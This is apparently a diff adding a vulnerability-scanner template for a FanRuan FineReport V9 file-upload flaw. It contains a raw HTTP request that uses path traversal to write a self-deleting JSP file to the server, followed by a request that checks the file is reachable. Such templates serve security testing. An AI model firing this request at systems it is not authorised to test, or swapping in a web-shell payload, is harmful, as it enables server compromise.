@@ -1,0 +1,34 @@
+id: poc-yaml-fanruan-v9-file-upload
+
+info:
+  name: poc-yaml-fanruan-v9-file-upload
+  author: Aurora
+  severity: high
+  tags: xray-converted,fileupload,ct-474069
+  reference:
+    - https://github.com/YinWC/2021hvv_vul/blob/master/0408/%E5%B8%86%E8%BD%AF%20V9getshell%20FineReport%20V9.md
+
+http:
+  - raw:
+      - |
+        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{rand_base(8)}}.svg.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        {"__CONTENT__":"<%out.println(\"{{rand_base(8)}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>","__CHARSET__":"UTF-8"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /WebReport/{{rand_base(8)}}.svg.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
